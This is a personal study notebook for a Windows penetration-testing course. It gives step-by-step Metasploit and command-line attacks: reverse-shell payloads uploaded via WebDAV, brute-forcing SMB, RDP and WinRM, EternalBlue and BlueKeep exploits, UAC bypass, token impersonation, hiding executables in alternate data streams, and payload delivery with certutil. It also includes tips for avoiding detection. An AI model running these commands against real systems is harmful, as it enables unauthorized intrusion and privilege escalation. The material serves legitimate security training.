
Exploiting WebDAV With Metasploit 

- Start with nmap scan on target to confirm that IIS is running and WebDav is configured 
	- *nmap -sV -p 80 --script=http-enum target* 
- Now lets try to start with a meterpreter session (reverse shell) 
	- MSFvenom is a tool that allows you to generate a payload that provide you with remote/remote access with system (Msfvenom can generate payloads in different formats, such as executable files, shellcode, dynamic-link libraries (DLLs), JavaScript, Python scripts, and more.) 
- *msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your own ip) LPORT=port that is open on your system -f asp > meterpreter.asp* 
	- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > meterpreter.asp 
		- - `msfvenom`: This is the command to execute the msfvenom tool.
		- `-p windows/meterpreter/reverse_tcp`: This parameter specifies the payload to be generated. In this case, it is using the "meterpreter" payload, which is a versatile payload that provides advanced functionality and allows interactive control of the compromised system. It is designed for Windows targets and uses a reverse TCP connection.
		- `LHOST=10.10.5.2`: This parameter specifies the **local IP address (host)** for the reverse connection. You should replace it with the IP address of the system where the listener (the system that will receive the connection) is running. In this case, it is set to `10.10.5.2`.
		- `LPORT=1234`: This parameter specifies the **local port number** for the reverse connection. You should replace it with the port number where the listener is configured to listen for incoming connections. In this case, it is set to `1234`.
		- `-f asp`: This parameter specifies the output format for the generated payload. In this case, it is set to ASP (Active Server Pages). The generated payload will be in the form of an ASP script.
		- `> meterpreter.asp`: This part redirects the output of the msfvenom command to a file named "meterpreter.asp". The generated ASP payload will be saved in this file.

		1. Payload: `windows/meterpreter/reverse_tcp` The `windows/meterpreter/reverse_tcp` payload is a specific type of payload available in the Metasploit Framework. It creates a reverse TCP connection from the target machine to the attacker's machine. Once the connection is established, it allows the attacker to execute commands and interact with the compromised system.
		    
		    In a reverse TCP scenario, the exploited system initiates the connection to the attacker's machine, which is typically listening on a specific IP address (`LHOST`) and port (`LPORT`). This type of connection is useful when the exploited system is behind firewalls or other network restrictions that might prevent direct incoming connections.
		    
		2. Output File: `meterpreter.asp` The `meterpreter.asp` file is the output file generated by the `msfvenom` tool, which is a payload generator within the Metasploit Framework. The `-f asp` flag specifies that the output file should be in ASP format, which is a file extension commonly associated with Active Server Pages.
		    
		    The generated `meterpreter.asp` file contains the payload code in ASP format. When this file is executed on a vulnerable web server, it establishes a reverse TCP connection back to the attacker's machine, allowing them to gain control over the compromised system.
		    
		    In summary, the `windows/meterpreter/reverse_tcp` payload establishes a reverse TCP connection from the target machine to the attacker's machine, while the `meterpreter.asp` file is the output file that contains the payload code in ASP format.
		    
Now... moving to cadaver 
- use cadaver to get sudo shell: cadaver http://target-ip/webdav
	- 'ls' to list the files 
	- use **put** to upload the file that you created: put /root/meterpreter.asp 
- before executing the malicious file we need to set up a listener/handler that will receive the reverse connection from target system and then send the stage which will give you a meterpreter session when executed 
	- start up metasploit framework console session: **service postgresql start && msfconsole**
		-  "service postgresql start": This command starts the PostgreSQL service. PostgreSQL is an open-source relational database management system. The "service" command is used to manage system services in many Linux distributions. In this case, it's starting the PostgreSQL service.
			- PostgreSQL is one of the supported databases for Metasploit, and it can be used as a data store for various features and functionalities within the framework. By default, Metasploit uses an SQLite database, but using PostgreSQL can offer better performance and scalability, especially when dealing with larger datasets or multiple concurrent users.
			- The command "service postgresql start" is used to start the PostgreSQL service if it is installed on the system. It ensures that the PostgreSQL service is up and running, allowing Metasploit to connect to and utilize a PostgreSQL database.
		-  "&&": This is the logical AND operator in shell scripting. It allows you to execute multiple commands sequentially, with the second command executing only if the first command succeeds (i.e., returns an exit status of 0). If the first command fails, the second command won't be executed.
		- "msfconsole": This command launches the Metasploit Framework console. Metasploit is a widely-used open-source penetration testing framework that provides various tools for exploiting vulnerabilities in computer systems. The "msfconsole" command starts the interactive command-line interface for the Metasploit Framework, where you can execute various commands and modules for penetration testing purposes.
		- By combining these commands using "&&", the shell will start the PostgreSQL service and, if successful, proceed to launch the Metasploit Framework console.

- Setting up handler/listener in metasploit by using metasploit module : 
	- use multi/handler 
	- set payload windows/meterpreter/reverse_tcp  (let op dat jouw payload naam overeenkomt met wat je hier invoert)
	- show options 
	- set LHOST  yourip
	- set LPORT  openport 
	- run 
- execute malicious payload by clicking on the file name in webdav browser 
- run sysinfo to see if it was successfull 
- run getuid to check your privileges 

delete shell.asp will delete the file, this is good to do once you have access, to avoid detection 

We have a second option using metasploit 

- search iis upload ![[Pasted image 20230703111527.png]]
- use exploit/windows/iis/iis_webdav_upload_asp
	- show options 
	- set  HttpUsername bob  
	- set  HttpPassword password_123321
	- set RHOST to targtet ip 
	- set Rport 
	- set PATH /webdav/metasploit.asp  (this is what will be uploaded)
	- exploit (this will start reverse tcp handler)



------------------------- LAB -------------------------

![[Pasted image 20230703112538.png]] 

![[Pasted image 20230703121659.png]] ![[Pasted image 20230703121957.png]]
![[Pasted image 20230703122802.png]]
![[Pasted image 20230703122811.png]]
-- 

## Exploiting SMB With PsExec 

- short info about SMB 
	- SMB is a network file sharing protocol that is used to facilitate the sharing of files and peripherals like printers between computers on a local network (LAN)
	- port 445 back in the day above NetBIOS using 139 
	- SAMBA is the open source Linux implementation of SMB and allows Windows systems to access Linux shared and devices 

- SMB authentication 
	- The SMB protocol utilizes two levels of authentication, namely: 
		- User Authentication -> users must provide a username and password in order to authenticate with the SMB server in order to access a share 
		- Share Authentication -> Users must provide a password in order to access restricted share 
	- both of them utilize a challenge response authentication system 
![[Pasted image 20230703123352.png]]

- PsExec 
	- PsExec is a lightweight telnet-replacement developed by Microsoft that allows you to execute processes on remote windows systems using any users credentials 
	- PsExec authentication is performed via SMB 
	- PsExec can be utilized to authenticate with target system legitimately and run arbitrary commands or launch a remote command prompt 
	- very similar to RDP, however, instead of controlling the remote system via GUI (which is the case in RDP), commands are sent via CMD 

PsExec uses the Server Message Block (SMB) protocol for authentication when establishing a connection to remote systems. PsExec is a command-line tool developed by Microsoft Sysinternals that allows for the execution of processes on remote systems. It leverages SMB to authenticate with the remote system and execute commands or run programs.

When PsExec is used to connect to a remote system, it establishes an SMB session to the administrative share (C$) on the target machine. It then uses the provided credentials (username and password) to authenticate and gain access to the remote system. The authentication process relies on the SMB protocol for secure communication and credential validation.

It's worth noting that PsExec requires administrative privileges on the remote system to function properly. Additionally, SMB can use different authentication mechanisms, such as NTLM or Kerberos, depending on the configuration and the environment.

- SMB Exploitation With PsExec 
	- In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate users accounts and their respective passwords or password hashes 
	- this can be done by leveraging various tools and techniques, however most common technique will involve performing an SMB login brute-force attack 
	- brute force attack on administrator 
	- after obtaining legitimate user account and password, we use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell 


- start with service version detection and default script with nmap: nmap -sV -sC 
	- Message signing enabled but not required means you can authenticate with this system via PsExec  ![[Pasted image 20230703124308.png]]
- Perform bruteforce with Metasploit module to get username and password that we can use for psexec 
	- service postgresql start && msfconsole 
	- search smb_login 
		- The auxiliary modules are mainly used for information gathering 
	- use module and show options 
			- set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
			- set PASS_FILE /usr/share/metasploit/metasploit-framework/data/wordlists/unix_passwords.txt 
			- set RHOST targetip
			- set verbose false (als je niet alle attempts wilt zien)

open new tab 

- psexec.py (allows you to authenticate with target system)
	- psexec.py Adminstrator@targetip command_that_you_want_to_execute 
		- psexec.py Adminstrator@targetip cmd.exe ![[Pasted image 20230703125815.png]]
		- extend this attack with metasploit module to get meterpreter session 
			- search psexec 
			- use exploit/windows/smb/psexec 
			- show options (set rhost to targetip and set smbpassword en username )

------ LAB -------- 
**Objective:** Exploit the SMB service to get a meterpreter on the target and retrieve the flag!
- Dictionaries to use:
- /usr/share/metasploit-framework/data/wordlists/common_users.txt
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 

![[Pasted image 20230703152541.png]]![[Pasted image 20230703153551.png]]
![[Pasted image 20230703154518.png]]

### Exploiting Windows MS17-010SMB Vulnerability (EternalBlue) - CVE-2017-0144

- EternelBlue is the name given to a collection of Windows vulnerabilities that allows remote code execution 
- Developed by NSA and was leaked by Shadow Brokers in 2017 
- EternelBlue takes advantage of vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands 
- The EternalBlue exploit was used in the WannaCry ransomware attack 
- The vulnerability affects multiple versions of Windows (both 32 and 64 bit)
- Microsoft released a patch in 2017
- The EthernalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems. 
- The EthernalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system 
- tool: ![[Pasted image 20230704130440.png]]

Demo 

- Nmap to check smb service: **sudo nmap -sV -p 445 -O target** 
	- -O to check operating system 
- To check if target is vulnerable for eternal blue exploit use the following nmap script: **sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 target** 

Manual exploitation: Tool used: https://github.com/3ndG4me/AutoBlue-MS17-010 
1. Clone the repository (in kali repository) (check requirement install python)
2. navigate into shellcode directory 
3. give the shell_prep.sh executable permissions: chmod +x shell_prep.sh 
4. execute the bash script: ./shell_prep.sh 
5. say yes to msfvenom, add ip of kali vm (ifconfig), Lport (the port you want to listen to for the connection once the payload is executed on the target), choose regular shell, select stageless payload  ![[Pasted image 20230704140223.png]]
6. set up netcat listner in a different terminal: nc -nvlp 1234 
7. chmod +x externalblue_exploit7.py![[Pasted image 20230704140431.png]]![[Pasted image 20230704140522.png]]
			green = executable 
8. run the exploit: python eternalblue_exploit7.py targetip shellcode/sc_x64.bin 
9. go to terminel with the netcat listner - you see a command shell on the target system 

Automatically exploit eternelblue 
1. open msfconsole 
2. search eternalblue (aux will tell you if the system is vulnerable) (when you know tha the target is vulnerable use the exploit)
3. use: ![[Pasted image 20230704140841.png]]
4. run exploit after fixing the options 


## Exploiting RDP 

- Remote Desktop Protocol GUI remote access protocol used to remotely connect and interact with a Windows system 
- RDP uses TCP port 3389 by default but can be configured to run on any other tcp port 
- RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text 
- we can perform an rdp brute force attack to identify legitimate user credentials that we can use to gain remote access to the target system

demo 

- Perform nmap scan - port scan on target 
  OR
- service postgresql start &&msfconsole
- search rdp_scanner (aux/scanner/rdp/rdp_scanner), set options 

Bruteforce rdp
- Use hydra: **hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://targetip  -s rdp'port**
	- you can reduce the bruteforce speed with hydra,the default is 16 but you can change it to make sure that you dont cause damage to the customer you are pentesting 
	- you need to add -s the port because if you do not add the port it will assume the default rdp port 
- authenticate with credentials found in target: xfreerdp /u:administrator /p:qwertyuiop /v:targetip 
	- `xfreerdp`: This is the command to launch the FreeRDP client. used to initiate a remote desktop session - It will establish a graphical connection to the remote system, allowing you to interact with its desktop environment as if you were physically present at that machine. 
	- /u: specify the username used for the remote desktop session, /p is the password and /v is the target ip or hostname of the target system 
	- zet achter het targetip:port als de default port anders is anders kan je niet connecten 

------------- Lab --------------------
![[Pasted image 20230705135430.png]]
![[Pasted image 20230705140236.png]]
flag: port-number-3333![[Pasted image 20230705140914.png]]


### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep) 

- BlueKeep is given to an RDP vulnerability  in Windows that could potentially allow attackers to remotely  execute arbitrary code and gain access to windows system and network of target system 
- BlueKeep was made public in Microsoft in 2019 
- The Bluekeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allow attackers to gain access to chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication 
- Everything executed at kernel level means elevated privileges 
- Bluekeep vulnerability has various illegal PoC and exploit code that could be malicious in nature gebruik daarom alleen verified exploit code and modules for exploitation 
- The BlueKeep exploit has a MSF auxiliary module that could be used to check if a target system is vulnerable to the exploit and also has an exploit module that van be used to exploit the vulnerability on unpatched systems 
- BlueKeep exploit module can be used to exploit vulnerable windows systems and consequently provide us with privileged meterpreter sessions on the target system 
- Targeting Kernel space memory and applications can cause system crashes 

demo 
- run nmap to check for rdp: sudo nmap -p 3389 targetip 
- mfsconsole to check if target if vulnerable
	- search BlueKeep 
	- use the aux module and set options 
	- use 1 (it selects the module at index 1 in the current module category.)
	- set options of exploit module 
	- you need to manually configure the version of windows that you are targeting: show targets 
	- set target (number of target you need) 
	- exploit 
	- ![[Pasted image 20230705150616.png]] the size needs to be modified if it is to high because it will crash the target system 
	    --> be carefull with kernel exploit because they can crash a system and cause data loss 









### Exploiting WinRM 

About WinRM
- Windows Remote Management protocol can be uesd to facilitate remote access with Windows system over HTTP
- Makes life easier for system admins 
- WINRM is typically used in the following ways:
	- Remotely access and interact with Windows hosts on local network 
	- Remotely access and execute commands on windows systems 
	- Manage and configure Windows systems remotely 
	- WinRM typically uses TCP port 5985 and 5986 (HTTP)
- How is authentication facilitated? 
	- WinRM implements access control and security for communication between systems through various forms of authentication 
	-  We can use utility called "crackmapexec" to perform a brute-force on winrm in order to identify users and their passwords as well as execute commands on the target system 
	- we can also utilize a ruby script called "evil-winrm" to obtain a command shell session on the target system 
	
Demo 

- Perform nmap scan to check if winrm is enabled and running 
- when you cannot identify port 5985 (or 5986): run nmap on exact port 
- new terminal: launch crackmapexec 
	- start the bruteforce: **crackmapexec winrm  targetip -u adminstrator -p /usr/share/metasploit-framework/data/wordlists/unix_password.txt** 
	- execute arbitrary windows command on target: 
		- crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "whoami"
		- crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "systeminfo"
Can we obtain a command shell session? Yes! 
1) one way is with evil-winrm.rb:
	- **evil-winrm.rb -u adminstrator -p 'tinkerbell' -i targetip**
2) Metasploit 
	- service postgresql && msfconsole 
	- search winrm_script and use winrm_script_exec 
	- set FORCE_VBS true, set password and username 
		- By setting "force_vbs" to true, you are instructing the exploit module to force the execution of the specified script as a VBScript (VBS) file instead of a PowerShell script. This can be useful in scenarios where PowerShell execution is restricted or detected, but VBScript execution is allowed.

----- Lab ---- 

![[Pasted image 20230705170156.png]]
![[Pasted image 20230705170348.png]]

![[Pasted image 20230705171023.png]]

## Windows Kernel Exploits 


Privilege escalation
- Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in systems to elevate privileges from one user to another, typically to a user with administrative or root access on a system. 
- Privilege escalation is a vital element in attack life cycle 
- After gaining an initial foothold on a target system you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges

Windows Kernel
- A kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers 
- Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware: 
	- User mode:  Programs and services running in user mode have limited access to system resources and functionality 
	- Kernel mode: Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory 

Windows Kernel Exploitation 
- Kernel exploits on Windows will typically target vulnerabilities in the Windows Kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell 
- This process will differ based on the version of Windows being targeted and the kernel exploit being used 
- Privilege escalation on Windows systems will typically follow the following methodology: 
	 1) identify kernel vulnerabilities 
	 2) Downloading, compiling, and transferring kernel exploits onto the target system 

Tools & Environment 
-  Windows-Exploit-Suggester: this tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins 
  https://github.com/AonCyberLabs/Windows-Exploit-Suggester 
- Windows-Kernel-Exploits: Collection of winodws kernel exploits sorted by CVE 
  https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135 


demo is on bases of windows 7 
![[Pasted image 20230705183039.png]]
goal is to elevate privileges 

- the command in msf getsystem tries to elevate privileges 
- module in msf will enumerate all vulnerabilities for windows 7: suggester (it will show which exploits you can use to elevate your privliges![[Pasted image 20230705183219.png]]
- use the command background to put sessions in the background - type sessions to list active sessions or jobs, enter session number to go to the session you want to bring back 
- 
-WATCH THIS VIDEO AGAIN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 




### Bypassing UAC with UACMe 

User Account Control 
- User Account Control is a Windows Security feature introduced in windows Vista that is used to prevent unauthorized changes from being made to the operating system 
- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group 
- A non-privileges user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileges user will be prompted with a consent prompt
   ![[Pasted image 20230705201332.png]]
   - Attacks can bypass UAC in order to execute malicious executables with elevated privileges 
     
Bypassing UAC 
-  In order to successfully bypass UAC, we will need to have access to a user account that is part of the local administrators group on the Windows Target system 
- UAC allows a program to be executed with administrative privileges consequently prompting the user for confirmation 
- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation 
- There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system 

UACMe
- open source robust privilege escalation tool can be used to bypass windows UAC 
- The UACMe GitHub repository contains documented list of methods that can be used to bypass multiple versions of Windows ranging from Windows 7 to 10 
- It allows attackers to execute malicious payloads on a windows target with administrative/elevated privileges by abusing the inbuilt Windows AuteElevate tool. 
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target. 

UAC on windows system 
- open CMD in windows: net users 
- check members of the group: net localgroup administrators 

Tool: https://github.com/hfiref0x/UACME 
In order to elevate privileges by bypassing UAC, you will need access to a user that is a member of the local administrators group

---

1. Perform an Nmap scan on the target system to gather information about open ports and services.
    
2. Try to access the web server on the target system by connecting to port 80.
    
3. Start up the Metasploit Framework:
    
    - Search for the exploit targeting the Rejetto HTTP File Server (HFS) vulnerability, which is a lightweight web server software.
    - Configure the exploit by setting the required options.
    - Perform basic local enumeration:
        - Retrieve system information using the `sysinfo` command.
        - Identify the process ID for `explorer.exe` using the `pgrep explorer` command.
        - Migrate to the `explorer` session using the process ID (e.g., `migrate 2448`). This is done to match the architecture of the Meterpreter session with the target system for compatibility.
        - Retrieve system information again using the `sysinfo` command to verify the successful migration.
	        - Run the command `net user` to view all the users on the system.
	        - Run the command `net localgroup administrators` to verify that the current user is part of the local administrators group. Ensure that the "Administrator" account is listed within the administrators group. This indicates that the user can execute programs with elevated privileges.
	          
1. In a new window:
    
    - Generate the payload using `msfvenom`: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe > backdoor.exe`.
      
5. In another new Metasploit console window:
    
    - Set up a listener using the `multi/handler` module in Metasploit.
    - Configure the listener by setting the payload to `windows/meterpreter/reverse_tcp` and specifying LHOST as your IP and LPORT as 1234.
    - Run the listener and then return to the previous Meterpreter session (part 2).
      
6. In the previous Meterpreter session:
    
    - Check the current working directory using `pwd`.
    - Retrieve the current user ID using `getuid`.
    - Verify privileges using `getprivs` to ensure the current privileges.
    - Change the directory to `C:\\` using `cd C:\\`.
    - Create a new directory named "Temp" using `mkdir Temp`.
    - Change to the Temp directory using `cd Temp`.
    - Upload the `backdoor.exe` file to the target system using `upload backdoor.exe`.
    - Upload the `Akagi64.exe` file from the path `/root/Desktop/tools/UACME/Akagi64.exe` using `upload /root/Desktop/tools/UACME/Akagi64.exe`.
7. Open a new shell in Meterpreter using the `shell` command.
    
    - Run the command `\.\\Akagi64.exe 23 c:\Temp\\backdoor.exe` to bypass UAC and execute the backdoor.
8. Go back to the listener console window (where the Meterpreter session with higher privileges is active):
    
- Observe the stage being sent: Monitor the progress of the active session.
- Run `sysinfo`: Gather system information, including details about the compromised system.
- Run `getuid`: Check the current user ID to determine the privileges of the compromised session.
- Gain elevated privileges using the `getprivs` command: Attempt to acquire additional privileges beyond the current level.
- Use the `getsystem` command: This command in Meterpreter is used to escalate privileges on a compromised system. It attempts to elevate the current Meterpreter session to the highest available privilege level, typically aiming for SYSTEM-level privileges on Windows systems.
- List the process tree using `ps`: View the running processes on the compromised system.
- Migrate to another process using the `migrate processid` command: By migrating to another process, such as `lsass.exe` (Local Security Authority Subsystem Service), the attacker gains access to high-level privileges and sensitive security-related information. Migrating to `lsass.exe` offers advantages such as privilege elevation and persistence.
- Check the current user ID again using `getuid`: Verify if the user ID has changed after migrating to the new process.



----

Lab 

**UACME:**
- Defeat Windows User Account Control (UAC) and get Administrator privileges.
- It abuses the built-in Windows AutoElevate executables.
- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
- Developed by https://twitter.com/hFireF0X

**Objective:** Gain the highest privilege on the compromised machine and get admin user NTLM hash.


![[Pasted image 20230705234559.png]]

![[Pasted image 20230706153531.png]]

![[Pasted image 20230706153850.png]]




## Access Token Impersonation 

- Windows access tokens are core element of the authentication process on Windows and are created an managed by the Local Security Authority Subsystem Services (LSASS)
- A windows access token is responsible for identifying and describing the security context of a process or threat running on a system. Simply put an access token be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed 
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token. 

Windows access Tokens 
- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privilege's that are assigned to a specific token
- An access token will typically be assigned one of the following security levels:
	- Impersonate-level tokens are created as direct result of a non-interactive login on Windows, typically through specific system services or domain logons 
	- Delegate-level tokens are created through an interactive login on Windows, primarily through a traditionally login or through remote access protocols such as RDP
- Impersonate level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system 

**Interactive Logon:** An interactive logon refers to a user logging into a system through direct interaction, typically by entering credentials at the login screen or through a user interface. It involves a user physically or remotely accessing the system and providing authentication credentials for their login. Examples of interactive logon methods include traditional logins, where a user enters their username and password, or remote access protocols like RDP, where a user connects to a remote system using credentials.

**Non-Interactive Logon**: A non-interactive logon, on the other hand, occurs when a login process is initiated automatically without direct user interaction. It is typically performed by system services or domain logons, such as when a service starts or when a computer joins a domain. Non-interactive logons do not require the user to enter credentials directly but rely on pre-configured authentication mechanisms or system-generated tokens.

**Impersonate-Level Tokens**: Impersonate-level tokens are access tokens that are created as a result of a non-interactive logon. These tokens are primarily used to allow a process to impersonate a user or another security context within the local system. They have limited scope and can only be used to impersonate tokens on the local system where they were created. Impersonate-level tokens are often associated with system services or background processes that require limited access to resources.

**Delegate-Level Tokens:** Delegate-level tokens, on the other hand, are created through an interactive logon process. These tokens are generated when a user logs in interactively, providing their credentials for authentication. Delegate-level tokens have a broader scope compared to impersonate-level tokens. They can be used not only for local system impersonation but also for impersonating tokens on external systems. Delegate-level tokens pose a higher security risk because they can be leveraged to gain access to resources across multiple systems.

Windows privileges 
- The process of impersonating access token to elevate privileges on a system will primarily depend on the privileges assigned to the account to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens are available 
- The following are the privileges that are required for a successful impersonation attack: 
	- SeAssignPrimaryToken: this allows a user to impersonate tokens: 
	- SeCreateToken: This allows user to create an arbitrary token with administrative privilege's 
	- SelmpersonatePrivilege: This allows a user to create a process under security context of another user typically with administrative privileges' 

The Incognito Module
- Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation 
- We can use the incognito module to display a list of available tokens that we can impersonate 

Demo: 

1. obtain initial access into target system
	1. Perform nmap scan on target to check webserver on port 80 
	2. Visit in the browser and see the rejetto HTTP file server 
2. startup mfsconsole
	1. search for rejetto module and exploit 
	2. set default payload (windows/meterpreter/reverse_tcp)
	3. set lhost and lport rhost 
3. this will give you a meterpretersession 
	 - run sysinfo 
	 - migrate our meterpreter session into different process: pgrep explorer and then migrate to this id 
	 - getuid 
		 - Local service is by default unpriviliged, run: **getprivs** to check priviliges that you have 
		 - The SeImpersonatePrivilige can be used to impersonate other  access tokens![[Pasted image 20230706193427.png]]
		- load incognito 
		- list_tokens -u 
		- copy the name of the first accesstoken 
		- impersonate_token "paste name token"
			- getuid 
			- getprivs 
			- pgrep explorer 
			- migrate to explorer.exe 
			- getprivs 

When you do not find privileged access tokens -> use patato attack 

![[Pasted image 20230706211910.png]]

## Alternate Data Streams 

- Alternative Data Streams (ADS) is an NTFS (new Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS (hierarchical File system )
- Any file created on an NTFS formatted drive will have two different forks/streams 
	- Data stream - Default stream that contains the data of the file 
	- Resource stream - Typically contains the metadata of the file 
- Attackers can us ADS to hide malicious code or executables in legitimate files in order to evade detection 
- This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file 
- This technique is usually used to evade basic signature based AVs and Static scanning tools 

demo 
how to hide executable in legitimate file?

- navigate to temp directory in windows 
- open cmd: 
	- cd Desktop 
	-  create file: notepad test.txt 
	- create file and add in helloword in file 
	- open the file that is on the desktop 
		- properties -> details (metadata) -> delete the txt with delete 
![[Pasted image 20230706221313.png]]

- notepad test.txt:secret.txt (hidden secret.txt file)

- WinPiece is a utility used by penetration testers to perform local enumeration on a windows system in order to identify vulnerabilities that can be exploited or vulnerabilities that can be exploited to elevate our privileges' its not something malicious but its something that you want to keep hidden as much as possible. 
- rename the WInpiece exe to payload and move it to temp directory 
- navigate into temp 
	- type payload.exe > windowslog.txt:winpiece.exe 
The  command `type payload.exe > windowslog.txt:winpiece.exe` reads the contents of the file `payload.exe` and redirects the output to a file named `windowslog.txt:winpiece.exe`. The resulting file will contain the contents of `payload.exe` with the specified filename `winpiece.exe` inside the `windowslog.txt` file. 
- delete payload because its now into windpiece.exe which is stored in resource stream of windlowslogs.txt file 
- execute the exe: start windowslog.txt:windpeas.exe 
	- did not work? create symbolic link
		- create symbolic link within windows directory under windows\\system32:
			- **mklink wupdate wupdate.txt** **c:\temp\windowslog.txt:winpeas.exe** 
			  (when you type wupdate it will automatically execute the hidden WinPiece executable hidden within the resource stream)
			- run with elevated session: run as administrator![[Pasted image 20230706224610.png]]
	















# Windows Credential Dumping 

### Windows Password Hashes

Windows password hashes 
- The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
- Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value
- Authentication and verification of user credentials are facilitated by the Local Security Authority (LSA).
- Windows versions up to Windows Server 2003 utilize two different types of hashes: 
	- LM
	- NTLM.
- Windows **disables** LM hashing and utilizes NTLM hashing from Windows Vista onwards.

SAM Database 
- The SAM (Security Account Manager) is a is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process
- In modern versions of Windows, the SAM database is encrypted with a **syskey**.
 - Note: Elevated/Administrative privileges are required to access and interact with the LSASS process.

LM (LanMan) 
- LM is the default hashing algorithm used in Windows operating systems prior to NT4.0.
- The LM hashing protocol for user passwords involves:
    - Breaking the password into two seven-character chunks.
    - Converting all characters to uppercase.
    - Hashing each chunk separately with the DES algorithm.
- LM hashing is considered weak and susceptible to cracking due to the lack of salts in the password hash, making brute-force and rainbow table attacks effective against LM hashes
	- a salt is a random value that is added to a password before it is hashed

![[Pasted image 20230706225907.png]]

NTLM (NTHash)
- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
  
- From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM\ hashing. When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.

- NTLM improves upon LM in the following ways:
	+ Does not split the hash in to two chunks.
	+ Case sensitive.
	+ Allows the use of symbols and unicode characters

![[Pasted image 20230706225922.png]]



### Searching for Passwords in Windows Configuration in Files 

Windows Configuration Files (not third party)

- Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
- This is typically done through the use of the Unattended Windows Setup utility,
- which is used to automate the mass installation/deployment of Windows on
- systems.
- This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.
- If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.

Unattended Windows Setup 
- The Unattended Windows Setup utility configuration file, commonly known as the "unattend.xml" file, is an XML-based configuration file used in Windows operating systems to automate the installation process. It allows for unattended installations, meaning that the installation proceeds without requiring user intervention or input.
- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
	- C:\\Windows\\Panther\\Unattend.xml
	- C:\\Windows\\Panther\\Autounattend.xml
- As a security precaution, the passwords stored in the Unattended Windows
- Setup configuration file may be encoded in base64

![[Pasted image 20230707111320.png]]

Demo - find password of administrator within a legitimate windows config file 

1. get access to victim 
	- generate meterpreter payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=yourip LPORT=1234 -f exe >payload.exe 
	- python -m SimpleHTTPServer 80 
		- This command starts a simple HTTP server using Python. The server listens on port 80, which is the default port for HTTP traffic. The reason why Python's built-in HTTP server is used to host the payload (`payload.exe`) is that it provides a convenient and lightweight way to serve the file to potential victims. By hosting the file on a server, an attacker can share the payload's download link and trick users into downloading and executing the malicious file. Once executed, the meterpreter payload establishes a reverse TCP connection back to the attacker's machine, enabling them to gain unauthorized access and control over the victim's system. 
	- Transfer file to victim system: 
		- open cmd in victim system;
			- certutil -urlcache -f  http://yourip/payload.exe payload.exe 
				- - `certutil`: This is a command-line tool available in Windows operating systems. It is primarily used for managing certificates and certificate-related operations.
